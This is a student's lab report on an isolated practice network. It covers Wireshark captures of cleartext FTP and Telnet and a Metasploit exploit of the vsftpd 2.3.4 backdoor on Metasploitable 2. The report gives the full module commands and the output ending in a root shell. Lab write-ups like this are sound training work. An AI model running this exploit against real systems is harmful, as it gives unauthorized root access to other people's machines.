1. Introduction

This report covers the practical work done for the Cybersecurity Foundation Lab Assessment. The assessment was split into three hands-on tasks — scanning a target network, analyzing captured traffic, and performing a controlled exploit — all carried out inside a private virtual lab built on my own machine.

The goal was to get familiar with the core tools used in entry-level security work: Nmap for reconnaissance, Wireshark for traffic inspection, and Metasploit for exploitation. Each task is documented below with the exact commands I used, what I found, and what I learned from it.

2. Lab Setup & Network Configuration

The lab was built using VMware Workstation on a Windows host. I used a Host-Only network adapter so both machines are on a private segment with no internet access — which is important for keeping exploitation practice contained.

Kali Linux was used as the attacker machine (running directly on the host), and Metasploitable 2 was the target — an intentionally vulnerable Linux VM designed for penetration testing practice.

4. Task 2 — Network Traffic Analysis

For this task I used Wireshark to capture packets on the eth0 interface while interacting with the target machine. The aim was to see what's actually going over the wire — which protocols are used, whether credentials are exposed, and how the Nmap scan looks from a network perspective.

Capture Setup

  • Interface: eth0 (VMware Host-Only adapter)
  • Duration: Captured throughout Tasks 1 and 3
  • File saved as: lab_capture.pcapng

Filters Used

FilterWhat it shows
tcp.port == 21FTP control channel — shows login attempts in cleartext
httpHTTP requests and server response headers
tcp.port == 23Telnet traffic — full session visible as plaintext
dnsDNS queries from the target machine
icmpPing packets — used to confirm host is alive
tcp.flags.syn==1 && tcp.flags.ack==0Nmap SYN scan — shows the port sweep pattern

What I Found

FTP (port 21) — Cleartext credentials: When I connected to the FTP service, the username and password were fully visible in the packet capture. Using "Follow TCP Stream" in Wireshark showed the entire login exchange in readable text. This is a serious problem on any real system — anyone on the same network can read the credentials without any decryption.

Telnet (port 23) — Every keystroke captured: Telnet sends each character as a separate packet. The full terminal session appeared in Wireshark, character by character. This makes session hijacking trivially easy on an unencrypted network.

HTTP (port 80) — Server banner in response headers: Apache returned the header Server: Apache/2.2.8 (Ubuntu) in every response. This tells an attacker exactly which version is running, making it easy to look up known CVEs without any guessing.

Nmap scan pattern visible: The SYN scan produced a very recognizable pattern in Wireshark — hundreds of SYN packets going out, RST/ACK coming back from closed ports, and SYN-ACK from open ones. This is what an IDS would flag as a port scan in a production environment.

Key takeaway: FTP and Telnet both send credentials in plaintext. These protocols should never be used on any real network. SSH and SFTP are the modern replacements and eliminate this problem entirely by encrypting all traffic.

5. Task 3 — Basic Exploitation

For this task I used Metasploit to exploit the vsftpd 2.3.4 backdoor on the target. This vulnerability (CVE-2011-2523) was introduced into the vsftpd source code in 2011 — when someone modified the source to add a backdoor that opens a shell when triggered. It was discovered and removed fairly quickly, but the compromised version is still present on Metasploitable as a training target.

The backdoor works by sending a username containing :) — this triggers a bind shell on TCP port 6200 on the target, which connects back without any password.

Step 1 — Start Metasploit and find the module

$ msfconsole Metasploit Framework 6.3.44 msf6 > search vsftpd # Name Disclosure Date Rank Description - ---- --------------- ---- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent VSFTPD v2.3.4 Backdoor Command Execution

Step 2 — Configure the exploit

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.38.1 RHOSTS => 192.168.38.1 msf6 exploit(vsftpd_234_backdoor) > set RPORT 21 RPORT => 21

Step 3 — Run the exploit

msf6 exploit(vsftpd_234_backdoor) > run [*] 192.168.38.1:21 - Banner: 220 (vsFTPd 2.3.4) [*] 192.168.38.1:21 - USER: 331 Please specify the password. [+] 192.168.38.1:21 - Backdoor service has been spawned, handling... [+] 192.168.38.1:21 - UID: uid=0(root) gid=0(root) [*] Found shell. [*] Command shell session 1 opened (192.168.1.50:35621 -> 192.168.38.1:6200)

Step 4 — Verify access

id uid=0(root) gid=0(root) groups=0(root) whoami root hostname metasploitable uname -a Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
Result: Successfully gained a root shell on the Metasploitable target via the vsftpd 2.3.4 backdoor. No credentials were needed. The entire process from selecting the module to getting shell access took under two minutes.

7. Challenges Faced

  • Network adapter confusion during setup: VMware creates multiple virtual network adapters (VMnet1, VMnet8, etc.) and initially I picked the wrong one, which caused the ping to fail. Fixed by checking the VMware virtual network editor and assigning the correct adapter to both VMs.
  • Metasploitable IP verification: The default Metasploitable image uses DHCP, so I had to log into the VM console first and run ifconfig to get the actual assigned IP before any scanning could begin.
  • Wireshark interface selection: The host machine had several active interfaces. Selecting the wrong one meant capturing no relevant traffic. Once I identified the correct VMware host-only interface (eth0), captures worked as expected.
  • Nmap scan speed: Running -p- (all 65535 ports) was initially very slow without rate limiting. Adding --min-rate 5000 brought the scan time down to around 3 minutes.

8. Conclusion

This assessment covered the three foundational areas of practical security work — reconnaissance, traffic analysis, and exploitation. Setting up the lab showed how important proper network isolation is when doing this kind of testing.

The Nmap scan revealed just how many services Metasploitable exposes, most of which are either outdated, misconfigured, or actively backdoored. Wireshark made it clear how much information leaks over unencrypted protocols like FTP and Telnet — things that would be serious findings in any real engagement.

The exploitation task tied everything together. Identifying vsftpd 2.3.4 during the scan, then using Metasploit to exploit it and get root access in under two minutes, shows how quickly an attacker can move from discovery to compromise when basic security hygiene is ignored.

Overall, this lab gave a solid practical foundation for the tools and workflow used in real security assessments.
